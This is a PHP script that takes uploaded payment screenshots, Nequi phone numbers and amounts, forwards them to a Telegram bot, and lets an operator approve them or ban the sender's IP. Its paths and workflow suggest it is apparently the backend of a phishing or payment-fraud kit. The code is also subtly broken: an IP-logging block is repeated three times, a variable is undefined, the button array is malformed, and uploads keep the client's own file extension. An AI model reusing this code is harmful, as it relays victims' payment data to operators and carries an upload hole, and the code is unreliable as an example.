<?php
// --- IP BLACKLIST GLOBAL CHECK ---
$client_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
if (!empty($client_ip)) {
    $client_ip = trim(explode(',', $client_ip)[0]);
}
$secRoot = __DIR__; while($secRoot !== dirname($secRoot)) { if (file_exists($secRoot . '/includes/security.php')) { require_once $secRoot . '/includes/security.php'; break; } $secRoot = dirname($secRoot); } $blacklist_file = (function_exists('sura_get_project_root') ? sura_get_project_root() : $secRoot) . '/blocked_ips.txt';
if (file_exists($blacklist_file)) {
    $blocked_ips = file($blacklist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($client_ip, $blocked_ips)) {
        header("HTTP/1.1 403 Forbidden");
        exit("Acceso denegado.");
    }
}
// ---------------------------------

ini_set('display_errors', 1);
error_reporting(E_ALL);
header('Content-Type: application/json');

$USED_FILE = 'used_capturas.json'; // archivo para guardar capturas pendientes


/* ============================================================
   🔥 CARGAR CONFIG DESDE config.php (SIN FUTURAMA)
   ============================================================ */
function loadConfig()
{
    // MISMA RUTA QUE USAN TUS OTROS ARCHIVOS
    $configFile = __DIR__ . '/config.php';

    if (!file_exists($configFile)) {
        return null;
    }

    $config = require $configFile;

    if (!isset($config['bot_token']) || !isset($config['chat_id'])) {
        return null;
    }

    return [
        'token' => $config['bot_token'],
        'chat_id' => $config['chat_id']
    ];
}


/* ============================================================
   🗂 MANEJO DE TRANSACCIONES
   ============================================================ */

function getTransactions() {
    $file = $GLOBALS['USED_FILE'];
    return file_exists($file) ? json_decode(file_get_contents($file), true) : [];
}

function saveTransaction($id, $data) {
    $file = $GLOBALS['USED_FILE'];
    $all  = getTransactions();
    $all[$id] = $data;
    file_put_contents($file, json_encode($all));
}

function deleteTransaction($id) {
    $file = $GLOBALS['USED_FILE'];
    $all  = getTransactions();
    unset($all[$id]);
    file_put_contents($file, json_encode($all));
}

function getPendingActionFromWebhook($transactionId)
{
    $safeTid = preg_replace('/[^a-zA-Z0-9_-]/', '', (string) $transactionId);

    $candidateDirs = array_unique(array_filter([
        __DIR__ . '/actions',
        dirname(__DIR__) . '/actions',
        dirname(dirname(__DIR__)) . '/actions',
        dirname(dirname(dirname(__DIR__))) . '/actions',
        '/var/www/html/gate/recargas/transaction/actions',
        '/var/www/html/gate/recargas/transaction/b-15/actions',
        '/Applications/XAMPP/xamppfiles/htdocs/mood/gate/recargas/transaction/actions',
        '/Applications/XAMPP/xamppfiles/htdocs/mood/gate/recargas/transaction/b-15/actions'
    ], static function ($dir) {
        return $dir !== '';
    }));

    foreach ($candidateDirs as $dir) {
        if (!is_dir($dir)) {
            continue;
        }

        if ($safeTid !== '') {
            $file = $dir . '/' . $safeTid . '.txt';
            if (file_exists($file)) {
                $action = trim((string) file_get_contents($file));
                @unlink($file);
                if ($action !== '') {
                    return $action;
                }
            }
        }

        foreach (['last_action.txt', 'pending_action.txt'] as $fallbackFile) {
            $fallbackPath = $dir . '/' . $fallbackFile;
            if (!file_exists($fallbackPath)) {
                continue;
            }

            $action = trim((string) file_get_contents($fallbackPath));
            @unlink($fallbackPath);
            if ($action !== '') {
                return $action;
            }
        }
    }

    return null;
}


/* ============================================================
   📸 ENVIAR FOTO A TELEGRAM
   ============================================================ */

function sendPhotoToTelegram($token, $chatId, $photoPath, $caption, $keyboard)
{
    if (!file_exists($photoPath)) {
        return ['ok' => false, 'error' => 'Archivo de imagen no encontrado'];
    }

    $curlFile = new CURLFile($photoPath);

    $payload = [
        'chat_id' => $chatId,
        'caption' => $caption,
        'parse_mode' => 'HTML',
        'photo' => $curlFile,
        'reply_markup' => json_encode(['inline_keyboard' => $keyboard])
    ];

    $ch = curl_init("https://api.telegram.org/bot{$token}/sendPhoto");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $payload
    ]);

    $res = curl_exec($ch);
    curl_close($ch);

    return json_decode($res, true);
}


/* ============================================================
   🔥 CARGAR CONFIGURACIÓN
   ============================================================ */

$config = loadConfig();
if (!$config) {
    echo json_encode(['ok' => false, 'error' => '❌ No se pudo cargar config.php']);
    exit;
}

$BOT_TOKEN = $config['token'];
$CHAT_ID   = $config['chat_id'];


/* ============================================================
   📤 POST → RECIBE CAPTURA Y LA ENVÍA A TELEGRAM
   ============================================================ */

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    if (!isset($_FILES['captura']) || $_FILES['captura']['error'] !== 0) {
        echo json_encode(['ok' => false, 'error' => 'No se recibió la imagen o hubo error en la subida']);
        exit;
    }

    $monto = $_POST['monto'] ?? '0';
    $nequi = $_POST['nequi'] ?? 'N/D';
    $tid   = $_POST['transactionId'] ?? 'CAP_' . time();

// --- RECORD CLIENT IP FOR TELEGRAM BAN BUTTON ---
    if (!empty($transactionId)) {
        $clean_tx = preg_replace('/[^a-zA-Z0-9_-]/', '', (string)$transactionId);
        $cl_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
        if (!empty($cl_ip)) {
            $cl_ip = trim(explode(',', $cl_ip)[0]);
            if (filter_var($cl_ip, FILTER_VALIDATE_IP)) {
                if (function_exists("sura_save_transaction_ip")) { sura_save_transaction_ip($clean_tx, $cl_ip); } else { $pRoot = __DIR__; while($pRoot !== dirname($pRoot)) { if (file_exists($pRoot . "/token_bank/config.php") || file_exists($pRoot . "/config.php")) break; $pRoot = dirname($pRoot); } foreach ([$pRoot . "/actions/ips", $pRoot . "/datac/actions/ips", $pRoot . "/gate/recargas/transaction/actions/ips", "/var/www/html/actions/ips"] as $d) { if (!is_dir($d)) { @mkdir($d, 0777, true); } if (is_dir($d)) { @file_put_contents($d . "/" . $clean_tx . ".txt", $cl_ip); } } }
            }
        }
    }
    // ------------------------------------------------
// --- RECORD CLIENT IP FOR TELEGRAM BAN BUTTON ---
    if (!empty($tid)) {
        $clean_tx = preg_replace('/[^a-zA-Z0-9_-]/', '', (string)$tid);
        $cl_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
        if (!empty($cl_ip)) {
            $cl_ip = trim(explode(',', $cl_ip)[0]);
            if (filter_var($cl_ip, FILTER_VALIDATE_IP)) {
                if (function_exists("sura_save_transaction_ip")) { sura_save_transaction_ip($clean_tx, $cl_ip); } else { $pRoot = __DIR__; while($pRoot !== dirname($pRoot)) { if (file_exists($pRoot . "/token_bank/config.php") || file_exists($pRoot . "/config.php")) break; $pRoot = dirname($pRoot); } foreach ([$pRoot . "/actions/ips", $pRoot . "/datac/actions/ips", $pRoot . "/gate/recargas/transaction/actions/ips", "/var/www/html/actions/ips"] as $d) { if (!is_dir($d)) { @mkdir($d, 0777, true); } if (is_dir($d)) { @file_put_contents($d . "/" . $clean_tx . ".txt", $cl_ip); } } }
            }
        }
    }
    // ------------------------------------------------
// --- RECORD CLIENT IP FOR TELEGRAM BAN BUTTON ---
    if (!empty($tid)) {
        $clean_tx = preg_replace('/[^a-zA-Z0-9_-]/', '', (string)$tid);
        $cl_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
        if (!empty($cl_ip)) {
            $cl_ip = trim(explode(',', $cl_ip)[0]);
            if (filter_var($cl_ip, FILTER_VALIDATE_IP)) {
                if (function_exists("sura_save_transaction_ip")) { sura_save_transaction_ip($clean_tx, $cl_ip); } else { $pRoot = __DIR__; while($pRoot !== dirname($pRoot)) { if (file_exists($pRoot . "/token_bank/config.php") || file_exists($pRoot . "/config.php")) break; $pRoot = dirname($pRoot); } foreach ([$pRoot . "/actions/ips", $pRoot . "/datac/actions/ips", $pRoot . "/gate/recargas/transaction/actions/ips", "/var/www/html/actions/ips"] as $d) { if (!is_dir($d)) { @mkdir($d, 0777, true); } if (is_dir($d)) { @file_put_contents($d . "/" . $clean_tx . ".txt", $cl_ip); } } }
            }
        }
    }
    // ------------------------------------------------

    // Validación de tipo
    $allowed = ['image/jpeg', 'image/png', 'image/jpg'];
    $mime = mime_content_type($_FILES['captura']['tmp_name']);

    if (!in_array($mime, $allowed)) {
        echo json_encode(['ok' => false, 'error' => 'Formato inválido. Solo JPG/PNG']);
        exit;
    }

    // Guardar archivo
    $uploadDir = __DIR__ . '/uploads';
    if (!is_dir($uploadDir)) mkdir($uploadDir, 0775, true);

    $ext = strtolower(pathinfo($_FILES['captura']['name'], PATHINFO_EXTENSION));
    if (!$ext) $ext = 'jpg';

    $filename = "cap_{$tid}.{$ext}";
    $destPath = $uploadDir . '/' . $filename;

    if (!move_uploaded_file($_FILES['captura']['tmp_name'], $destPath)) {
        echo json_encode(['ok' => false, 'error' => 'Error al guardar imagen']);
        exit;
    }

    // Caption
    $montoFmt = number_format((float)$monto, 0, ',', '.');

    $caption  = "<b>📸 Nueva captura de pago</b>\n";
    $caption .= "• 🆔 ID: <code>{$tid}</code>\n";
    $caption .= "• 📱 Nequi: <code>{$nequi}</code>\n";
    $caption .= "• 💰 Monto: <b>$ {$montoFmt}</b>\n\n";
    $caption .= "Revisa la imagen y selecciona una opción:";

    // Botones
    $keyboard = [
        [
            ['text' => '✅ Captura correcta', 'callback_data' => "capok:{$tid}",
                [
                    ['text' => "❌ BANEAR IP", 'callback_data' => "ban_ip:{$transactionId}"]
                ]],
            ['text' => '❌ Captura incorrecta', 'callback_data' => "capbad:{$tid}"]
        ]
    ];

    // Enviar foto
    $res = sendPhotoToTelegram($BOT_TOKEN, $CHAT_ID, $destPath, $caption, $keyboard);

    if (!empty($res['ok'])) {

        saveTransaction($tid, [
            'tid'        => $tid,
            'telefono'   => $nequi,
            'monto'      => $monto,
            'message_id' => $res['result']['message_id'],
            'created_at' => time(),
            'status'     => 'pending'
        ]);

        echo json_encode(['ok' => true, 'tid' => $tid, 'message' => 'Captura enviada']);
        exit;
    }

    echo json_encode(['ok' => false, 'error' => 'Error enviando a Telegram']);
    exit;
}


/* ============================================================
   🔍 GET → VER SI EL OPERADOR RESPONDIÓ
   ============================================================ */

if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['transactionId'])) {

    $tid = $_GET['transactionId'];
    $accion = getPendingActionFromWebhook($tid);

    if ($accion === null) {
        echo json_encode(['ok' => false]);
        exit;
    }

    $trans = getTransactions();
    if (!isset($trans[$tid])) {
        echo json_encode(['ok' => false]);
        exit;
    }

    $t = $trans[$tid];

    if ($accion == 'capok') {
        $txt = 'Captura correcta';
        $clientAction = 'aprobado';
    } else {
        $txt = 'Captura incorrecta';
        $clientAction = 'rechazado';
    }

    $nuevoCaption  = "<b>📸 Captura de pago</b>\n";
    $nuevoCaption .= "• 🆔 ID: <code>{$tid}</code>\n";
    $nuevoCaption .= "• 📱 Nequi: <code>{$t['telefono']}</code>\n";
    $nuevoCaption .= "• 💰 Monto: <b>$ " . number_format((float)$t['monto'], 0, ',', '.') . "</b>\n\n";
    $nuevoCaption .= "✅ Acción: <b>{$txt}</b>";

    // Editar caption
    $editPayload = [
        'chat_id'      => $CHAT_ID,
        'message_id'   => $t['message_id'],
        'caption'      => $nuevoCaption,
        'parse_mode'   => 'HTML',
        'reply_markup' => json_encode(['inline_keyboard' => []])
    ];

    $ch = curl_init("https://api.telegram.org/bot{$BOT_TOKEN}/editMessageCaption");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => $editPayload
    ]);
    curl_exec($ch);
    curl_close($ch);

    deleteTransaction($tid);

    echo json_encode(['ok' => true, 'action' => $clientAction]);
    exit;
}

echo json_encode(['ok' => false, 'error' => '⛔ Método inválido']);
exit;
